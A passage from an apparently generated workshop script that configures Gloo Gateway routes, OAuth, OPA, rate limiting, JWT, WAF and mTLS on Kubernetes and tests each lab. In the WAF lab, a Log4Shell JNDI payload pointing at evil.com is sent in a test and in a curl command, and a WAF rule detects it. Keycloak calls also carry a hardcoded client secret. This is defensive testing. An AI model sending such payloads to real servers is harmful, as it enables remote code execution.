  it('Checking text \'bar\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', body: 'bar', match: true }));
  it('Checking text \'custom\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', body: 'custom', match: true }));
  it('Checking text \'To-Remove\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', body: 'To-Remove', match: false }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/transformations/tests/request-headers.test.js.liquid from lab number 13"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 13"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /publicget
      backendRefs:
        - name: httpbin1
          port: 8000
      filters:
        - type: URLRewrite
          urlRewrite:
            hostname: httpbin1.com
            path:
              type: ReplacePrefixMatch
              replacePrefixMatch: /get
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("request rewrite applied", () => {
  it('Checking text \'httpbin1.com/get\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/publicget', body: 'httpbin1.com/get', match: true }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/transformations/tests/request-rewrite.test.js.liquid from lab number 13"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 13"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
      filters:
        - type: ResponseHeaderModifier
          responseHeaderModifier:
            add:
              - name: Foo
                value: bar
            set:
              - name: To-Modify
                value: newvalue
            remove:
              - To-Remove
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("response transformations applied", () => {
  it('Checking \'Foo\' and \'To-Modify\' headers', () => helpersHttp.checkHeaders({ host: `https://httpbin.example.com`, path: '/response-headers?to-remove=whatever&to-modify=oldvalue', expectedHeaders: [{'key': 'foo', 'value': 'bar'}, {'key': 'to-modify', 'value': 'newvalue'}]}));
  it('Checking text \'To-Remove\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/response-headers?to-remove=whatever&to-modify=oldvalue', body: 'To-Remove', match: false }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/transformations/tests/response-headers.test.js.liquid from lab number 13"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 13"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption
  namespace: httpbin
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: HTTPRoute
    name: httpbin
  options:
    stagedTransformations:
      regular:
        requestTransforms:
        - requestTransformation:
            transformationTemplate:
              extractors:
                client:
                  header: 'User-Agent'
                  regex: '^([^/\s]+).*'
                  subgroup: 1
              headers:
                x-client:
                  text: "{{ client }}"
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("request transformation applied", () => {
  it('Checking text \'X-Client\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{key: 'User-agent', value: 'curl/8.5.0'}], body: 'X-Client', match: true }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/transformations/tests/x-client-request-header.test.js.liquid from lab number 13"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 13"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption
  namespace: httpbin
spec:
  options:
    stagedTransformations:
      regular:
        responseTransforms:
        - responseTransformation:
            transformationTemplate:
              headers:
                x-request-id:
                  text: '{{ request_header("X-Request-Id") }}'
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      filters:
        - type: ExtensionRef
          extensionRef:
            group: gateway.solo.io
            kind: RouteOption
            name: routeoption
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("response transformation applied", () => {
  it('Checking \'X-Request-Id\' header', () => helpersHttp.checkHeaders({ host: `https://httpbin.example.com`, path: '/get', expectedHeaders: [{'key': 'x-request-id', 'value': '*'}]}));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/transformations/tests/x-request-id-response-header.js.liquid from lab number 13"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 13"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
kubectl delete --context ${CLUSTER1} -n httpbin routeoption routeoption
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
          weight: 80
        - name: httpbin2
          port: 8000
          weight: 20
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("traffic split applied", () => {
  it('Checking text \'httpbin1\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/hostname', body: 'httpbin1', match: true }));
  it('Checking text \'httpbin2\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/hostname', body: 'httpbin2', match: true }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/traffic-split/tests/traffic-split.test.js.liquid from lab number 14"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 14"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: enterprise.gloo.solo.io/v1
kind: AuthConfig
metadata:
  name: oauth
  namespace: httpbin
spec:
  configs:
    - oauth2:
        oidcAuthorizationCode:
          appUrl: "https://httpbin.example.com"
          callbackPath: /callback
          clientId: ${KEYCLOAK_CLIENT}
          clientSecretRef:
            name: oauth
            namespace: gloo-system
          issuerUrl: "${KEYCLOAK_URL}/realms/workshop/"
          logoutPath: /logout
          afterLogoutUrl: "https://httpbin.example.com/get"
          session:
            failOnFetchFailure: true
            redis:
              cookieName: keycloak-session
              options:
                host: redis:6379
          scopes:
          - email
          headers:
            idTokenHeader: jwt
          identityToken:
            claimsToHeaders:
              - claim: email
                header: X-Email
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption
  namespace: httpbin
spec:
  options:
    extauth:
      configRef:
        name: oauth
        namespace: httpbin
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      filters:
        - type: ExtensionRef
          extensionRef:
            group: gateway.solo.io
            kind: RouteOption
            name: routeoption
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
ATTEMPTS=1
timeout 60 bash -c 'while [[ "$(curl -m 2 --max-time 2 --insecure -s -o /dev/null -w ''%{http_code}'' https://httpbin.example.com/get)" != "302" ]]; do sleep 5; done'
export USER1_COOKIE=$(node tests/keycloak-token.js "https://httpbin.example.com/get" user1)
export USER2_COOKIE=$(node tests/keycloak-token.js "https://httpbin.example.com/get" user2)
ATTEMPTS=1
until ([ ! -z "$USER2_COOKIE" ] && [[ $USER2_COOKIE != *"dummy"* ]]) || [ $ATTEMPTS -gt 20 ]; do
  printf "."
  ATTEMPTS=$((ATTEMPTS + 1))
  sleep 3
  export USER2_COOKIE=$(node tests/keycloak-token.js "https://httpbin.example.com/get" user2)
done
ATTEMPTS=1
until ([ ! -z "$USER1_COOKIE" ] && [[ $USER1_COOKIE != *"dummy"* ]]) || [ $ATTEMPTS -gt 20 ]; do
  printf "."
  ATTEMPTS=$((ATTEMPTS + 1))
  sleep 3
  export USER1_COOKIE=$(node tests/keycloak-token.js "https://httpbin.example.com/get" user1)
done
echo "User1 token: $USER1_COOKIE"
echo "User2 token: $USER2_COOKIE"
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Authentication is working properly", function () {
  const cookieString = process.env.USER1_COOKIE;

  it("The httpbin page isn't accessible without authenticating", () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/get', retCode: 302 }));

  it("The httpbin page is accessible after authenticating", () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString }], retCode: 200 }));
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extauth-oauth/tests/authentication.test.js.liquid from lab number 15"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 15"; exit 1; }
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Claim to header is working properly", function() {
  const cookieString = process.env.USER2_COOKIE;
  it('The new header has been added', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString }], body: 'user2@solo.io' }));
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extauth-oauth/tests/header-added.test.js.liquid from lab number 15"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 15"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: allow-solo-email-users
  namespace: httpbin
data:
  policy.rego: |-
    package test

    default allow = false

    allow {
        [header, payload, signature] = io.jwt.decode(input.state.jwt)
        endswith(payload["email"], "@solo.io")
    }
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: enterprise.gloo.solo.io/v1
kind: AuthConfig
metadata:
  name: oauth
  namespace: httpbin
spec:
  configs:
    - oauth2:
        oidcAuthorizationCode:
          appUrl: "https://httpbin.example.com"
          callbackPath: /callback
          clientId: ${KEYCLOAK_CLIENT}
          clientSecretRef:
            name: oauth
            namespace: gloo-system
          issuerUrl: "${KEYCLOAK_URL}/realms/workshop/"
          logoutPath: /logout
          afterLogoutUrl: "https://httpbin.example.com/get"
          session:
            failOnFetchFailure: true
            redis:
              cookieName: keycloak-session
              options:
                host: redis:6379
          scopes:
          - email
          headers:
            idTokenHeader: jwt
          identityToken:
            claimsToHeaders:
              - claim: email
                header: X-Email
    - opaAuth:
        modules:
        - name: allow-solo-email-users
          namespace: httpbin
        query: "data.test.allow == true"
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Authentication is working properly", function () {

  const cookieString_user1 = process.env.USER1_COOKIE;
  const cookieString_user2 = process.env.USER2_COOKIE;

  it("The httpbin page isn't accessible with user1", () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString_user1 }], retCode: "keycloak-session=dummy" == cookieString_user1 ? 302 : 403 }));
  it("The httpbin page is accessible with user2", () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString_user2 }], retCode: 200 }));

});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extauth-oauth/tests/authorization.test.js.liquid from lab number 15"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 15"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption
  namespace: httpbin
spec:
  options:
    extauth:
      configRef:
        name: oauth
        namespace: httpbin
    stagedTransformations:
      regular:
        requestTransforms:
        - requestTransformation:
            transformationTemplate:
              extractors:
                organization:
                  header: 'X-Email'
                  regex: '.*@(.*)$'
                  subgroup: 1
              headers:
                x-organization:
                  text: "{{ organization }}"
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Transformation is working properly", function() {
  const cookieString = process.env.USER2_COOKIE;
  it('The new header has been added', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString }], body: 'X-Organization' }));
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/advanced-transformations/tests/header-added.test.js.liquid from lab number 16"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 16"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: ratelimit.solo.io/v1alpha1
kind: RateLimitConfig
metadata:
  name: limit-users
  namespace: httpbin
spec:
  raw:
    setDescriptors:
      - simpleDescriptors:
          - key: organization
            value: solo.io
        rateLimit:
          requestsPerUnit: 3
          unit: MINUTE
    rateLimits:
    - setActions:
      - requestHeaders:
          descriptorKey: organization
          headerName: X-Organization
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption
  namespace: httpbin
spec:
  options:
    extauth:
      configRef:
        name: oauth
        namespace: httpbin
    stagedTransformations:
      regular:
        requestTransforms:
        - requestTransformation:
            transformationTemplate:
              extractors:
                organization:
                  header: 'X-Email'
                  regex: '.*@(.*)$'
                  subgroup: 1
              headers:
                x-organization:
                  text: "{{ organization }}"
    rateLimitConfigs:
      refs:
      - name: limit-users
        namespace: httpbin
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Rate limiting is working properly", function() {
  const cookieString = process.env.USER2_COOKIE;
  it('The httpbin page should be rate limited', () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString }], retCode: 429 }));
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/ratelimiting/tests/rate-limited.test.js.liquid from lab number 17"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 17"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
kubectl delete --context ${CLUSTER1} -n httpbin routeoption routeoption
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gloo.solo.io/v1
kind: Upstream
metadata:
  name: keycloak
  namespace: gloo-system
spec:
  static:
    hosts:
      - addr: ${HOST_KEYCLOAK}
        port: ${PORT_KEYCLOAK}
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption
  namespace: httpbin
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: HTTPRoute
    name: httpbin
  options:
    jwtProvidersStaged:
      afterExtAuth:
        providers:
          keycloak:
            issuer: ${KEYCLOAK_URL}/realms/workshop
            tokenSource:
              headers:
              - header: jwt
            jwks:
              remote:
                url: ${KEYCLOAK_URL}/realms/workshop/protocol/openid-connect/certs
                upstreamRef:
                  name: keycloak
                  namespace: gloo-system
            claimsToHeaders:
            - claim: email
              header: X-Email
EOF
export USER1_COOKIE_JWT=$(curl -Ssm 10 --fail-with-body \
  -d "client_id=gloo-ext-auth" \
  -d "client_secret=hKcDcqmUKCrPkyDJtCw066hTLzUbAiri" \
  -d "username=user1" \
  -d "password=password" \
  -d "grant_type=password" \
  "$KEYCLOAK_URL/realms/workshop/protocol/openid-connect/token" |
  jq -r .access_token)
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Claim to header is working properly", function() {
  const jwtString = process.env.USER1_COOKIE_JWT;
  it('The new header has been added', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{ key: 'jwt', value: jwtString }], body: '"X-Email":' }));
  it('The new header has value', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{ key: 'jwt', value: jwtString }], body: '"user1@example.com"' }));
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/jwt/tests/header-added.test.js.liquid from lab number 18"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 18"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption
  namespace: httpbin
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: HTTPRoute
    name: httpbin
  options:
    jwtProvidersStaged:
      afterExtAuth:
        providers:
          keycloak:
            issuer: ${KEYCLOAK_URL}/realms/workshop
            tokenSource:
              headers:
              - header: jwt
            jwks:
              remote:
                url: ${KEYCLOAK_URL}/realms/workshop/protocol/openid-connect/certs
                upstreamRef:
                  name: keycloak
                  namespace: gloo-system
            claimsToHeaders:
            - claim: email
              header: X-Email
    rbac:
      policies:
        viewer:
          principals:
          - jwtPrincipal:
              claims:
                email: user2@solo.io
EOF
export USER2_COOKIE_JWT=$(curl -Ssm 10 --fail-with-body \
  -d "client_id=gloo-ext-auth" \
  -d "client_secret=hKcDcqmUKCrPkyDJtCw066hTLzUbAiri" \
  -d "username=user2" \
  -d "password=password" \
  -d "grant_type=password" \
  "$KEYCLOAK_URL/realms/workshop/protocol/openid-connect/token" |
  jq -r .access_token)
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Only User2 can access httpbin", function() {
  const jwt1String = process.env.USER1_COOKIE_JWT;
  it('User1 access is refused', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{ key: 'jwt', value: jwt1String }], body: 'RBAC: access denied' }));
  const jwt2String = process.env.USER2_COOKIE_JWT;
  it('User2 access is allowed', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{ key: 'jwt', value: jwt2String }], body: '"user2@solo.io"' }));
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/jwt/tests/only-user2-allowed.test.js.liquid from lab number 18"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 18"; exit 1; }

kubectl --context ${CLUSTER1} -n httpbin delete routeoption routeoption

kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: waf
  namespace: gloo-system
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: HTTPRoute
    name: httpbin
  options:
    waf:
      customInterventionMessage: 'Log4Shell malicious payload'
      ruleSets:
      - ruleStr: |
          SecRuleEngine On
          SecRequestBodyAccess On
          SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@*
            "@rx \\\${jndi:(?:ldaps?|iiop|dns|rmi)://"
            "id:1000,phase:2,deny,status:403,log,msg:'Potential Remote Command Execution: Log4j CVE-2021-44228'"
EOF
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
const helpersHttp = require('./tests/chai-http');
var chai = require('chai');
var expect = chai.expect;

describe("WAF is working properly", function() {
  it('The request has been blocked', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{key: 'User-Agent', value: '${jndi:ldap://evil.com/x}'}], body: 'Log4Shell malicious payload' }));
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/waf/tests/waf.test.js.liquid from lab number 19"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 19"; exit 1; }
curl -H "User-Agent: \${jndi:ldap://evil.com/x}" -k "https://httpbin.example.com/get" -i
kubectl delete --context ${CLUSTER1} -n gloo-system routeoption waf
openssl req -x509 \
  -nodes \
  -days 365 \
  -newkey rsa:4096 \
  -keyout client-ca.key \
  -out client-ca.crt \
  -sha512 \
  -subj "/CN=clientca"
kubectl -n gloo-system create secret generic tls-secret \
  --type=kubernetes.io/tls \
  --from-file=tls.crt \
  --from-file=tls.key \
  --from-file=ca.crt=client-ca.crt \
  --dry-run=client -o yaml \
  | kubectl --context ${CLUSTER1} apply -f -
openssl req -x509 \
  -nodes \
  -days 365 \
  -newkey rsa:4096 \
  -CA client-ca.crt \
  -CAkey client-ca.key \
  -keyout authorized-client.key \
  -out authorized-client.crt \
  -sha512 \
  -subj "/C=US/ST=Massachusetts/L=Boston/O=Solo-io/OU=pki/CN=authorized-client" \
  -addext "basicConstraints = CA:false" \
  -addext "extendedKeyUsage = clientAuth"
cat <<'EOF' > ./test.js
const chai = require("chai");
const helpersHttp = require('./tests/chai-http');
const https = require("https");

describe("Downstream mTLS", () => {
  it("rejects requests without client certificate", (done) => {
    const options = {
      hostname: `httpbin.example.com`,
      port: 443,
      path: '/get',
      method: 'GET',
      rejectUnauthorized: false,
      agent: false, // Disable the agent to avoid keeping sockets open for reuse, which leads to the test not exiting in some cases
    };

    const req = https.request(options, (res) => {
      done(new Error('Request should fail'));
    });

    req.on('error', (err) => {
      chai.expect(err.message).to.include('tlsv13 alert certificate required');
      done();
    });

    req.end();
  });

  it("allows requests with valid client certificate", async () => await helpersHttp.checkURL({
      host: `https://httpbin.example.com`,
      path: '/get',
      certFile: 'authorized-client.crt',
      keyFile: 'authorized-client.key',
      retCode: 200
    }));
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/downstream-mtls/tests/mtls.test.js.liquid from lab number 20"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 20"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: HttpListenerOption
metadata:
  name: forward-client-cert
  namespace: gloo-system
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: Gateway
    name: http
    sectionName: https-httpbin
  options:
    httpConnectionManagerSettings:
      forwardClientCertDetails: APPEND_FORWARD
      setCurrentClientCertDetails:
        subject: true
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Client certificate forwarding", () => {
  it('adds \'X-Forwarded-Client-Cert\' header', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', certFile: 'authorized-client.crt', keyFile: 'authorized-client.key', body: 'X-Forwarded-Client-Cert', match: true }));
})

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/downstream-mtls/tests/x-forwarded-client-cert.test.js.liquid from lab number 20"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 20"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: enterprise.gloo.solo.io/v1
kind: AuthConfig
metadata:
  name: client-cert-cn
  namespace: httpbin
spec:
  configs:
    - opaAuth:
        modules:
        - name: allow-authorized-clients-by-common-name
          namespace: httpbin
        query: "data.test.allow == true"
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: allow-authorized-clients-by-common-name
  namespace: httpbin
data:
  policy.rego: |-
    package test

    import future.keywords.if
    import future.keywords.in

    default allow := false

    allow if cn(input.http_request.headers["x-forwarded-client-cert"]) in ["authorized-client"]

    cn(client_cert) := cn if {
        # Split the client cert by semicolon and find the Subject
        cert_parts := split(client_cert, ";")
        some subject_string in cert_parts
        startswith(subject_string, "Subject=")
        subject := trim(trim_left(subject_string, "Subject="), "\\\\\"")

        # Extract the CN from the Subject field
        subject_parts := split(subject, ",")
        some cn_string in subject_parts
        startswith(cn_string, "CN=")
        cn := trim_left(cn_string, "CN=")
    }

EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption
  namespace: httpbin
spec:
  options:
    extauth:
      configRef:
        name: client-cert-cn
        namespace: httpbin
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      filters:
        - type: ExtensionRef
          extensionRef:
            group: gateway.solo.io
            kind: RouteOption
            name: routeoption
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
openssl req -x509 \
  -nodes \
  -days 365 \
  -newkey rsa:4096 \
  -CA client-ca.crt \
  -CAkey client-ca.key \
  -keyout unauthorized-client.key \
  -out unauthorized-client.crt \
  -sha512 \
  -subj "/C=US/ST=Massachusetts/L=Boston/O=Solo-io/OU=pki/CN=unauthorized-client" \
  -addext "basicConstraints = CA:false" \
  -addext "extendedKeyUsage = clientAuth"
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Authorization based on Common Name", () => {
    it("allows requests to httpbin with authorized client certificate", () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/get', certFile: 'authorized-client.crt', keyFile: 'authorized-client.key', retCode: 200 }));
    it("denies requests to httpbin with unauthorized client certificate", () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/get', certFile: 'unauthorized-client.crt', keyFile: 'unauthorized-client.key', retCode: 403 }));
})

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/downstream-mtls/tests/authorization.test.js.liquid from lab number 20"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 20"; exit 1; }
kubectl -n gloo-system create secret tls tls-secret \
  --key tls.key \
  --cert tls.crt \
  --dry-run=client -o yaml \
  | kubectl --context ${CLUSTER1} apply -f -
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
kubectl --context ${CLUSTER1} -n gloo-system delete HttpListenerOption forward-client-cert
kubectl --context ${CLUSTER1} -n httpbin delete AuthConfig client-cert-cn
kubectl --context ${CLUSTER1} -n httpbin delete ConfigMap allow-authorized-clients-by-common-name
kubectl --context ${CLUSTER1} -n httpbin delete RouteOption routeoption
cat <<'EOF' > ./test.js
const chaiHttp = require("chai-http");
const chai = require("chai");
const crypto = require("crypto")
const expect = chai.expect;

chai.use(chaiHttp);
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

const httpbin = `https://httpbin.example.com`;
const cachepath = '/cache/1';
var path_key;

describe("response caching", function() {

  // Make the first request whose response would be cached if enabled
  beforeEach(function(done) {
    path_key = crypto.randomUUID();
    chai.request(httpbin).get(cachepath).query({key: path_key}).end((err, response) => {
      if (err) return done(err);
      done();
    });
  });

  it('returns a fresh response within cache TTL', function(done) {
    setTimeout(() => {
      chai.request(httpbin).get(cachepath).query({key: path_key}).end((err, response) => {
        if (err) return done(err);
        try {
          expect(response).to.have.status(200);
          expect(response).to.not.have.header('age');
          done();
        } catch (e) {
          done(e);
        }
      });
    }, 100);
  });

})

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/caching/tests/caching-doesnt-apply.test.js.liquid from lab number 21"
